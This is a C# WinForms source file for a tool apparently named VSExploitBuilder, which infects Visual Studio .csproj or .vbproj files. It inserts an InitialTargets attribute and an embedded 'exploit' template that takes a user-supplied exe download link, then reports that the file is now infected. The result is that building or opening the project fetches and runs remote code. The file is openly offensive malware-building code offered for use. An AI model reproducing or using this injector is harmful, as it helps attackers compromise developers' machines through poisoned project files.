using Microsoft.Build.BuildEngine;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;

namespace VSExploitBuilder
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void btnExploit_Click(object sender, EventArgs e)
        {
            #region Link checking
            if (string.IsNullOrEmpty(txtLink.Text) == true)
            {
                MessageBox.Show("Please give a download link!");
                return;
            }
            else if(txtLink.Text.Contains("exe") != true)
            {
                MessageBox.Show("Please use an exe!");
                return;
            }
#endregion

            #region Variables
            string projectFile = File.ReadAllText(txtPath.Text);
            File.WriteAllText(txtPath.Text, projectFile);
            MessageBox.Show("g");
            #endregion

            #region Change InitialTargets
            projectFile = projectFile.Insert(projectFile.IndexOf("ToolsVersion"), "InitialTargets=\"Build\" ");
            #endregion

            #region Exploit
            string exploit = Properties.Resources.exploit;
            exploit = exploit.Replace("[LINK-REPLACE]", txtLink.Text);
            exploit = exploit.Replace("[EXE-REPLACE]", new Random().Next(3, 54345).ToString());

            projectFile = projectFile.Insert(projectFile.IndexOf("</Project>"), exploit);
            File.WriteAllText(txtPath.Text, projectFile);
            #endregion

            #region Inform User
            MessageBox.Show("Exploit Complete, File is now infected!");
            #endregion
        }

        private void txtPath_DragDrop(object sender, DragEventArgs e)
        {
            string loc = ((string[])e.Data.GetData(DataFormats.FileDrop))[0];

            if (Path.GetExtension(loc) == ".csproj" || Path.GetExtension(loc) == ".vbproj")
            {
                txtPath.Text = loc;
            }
            else
            {
                MessageBox.Show("Wrong file, please drop the project file!");
            }
        }

        private void txtPath_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
                e.Effect = DragDropEffects.Copy;
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog of = new OpenFileDialog())
            {
                of.Filter = "C# Project|*csproj|VB.NET Project|*vbproj";
                of.Title = "Select the project file";
                if (of.ShowDialog() == DialogResult.OK)
                {
                    txtPath.Text = of.FileName;
                }
            }
        }
    }
}
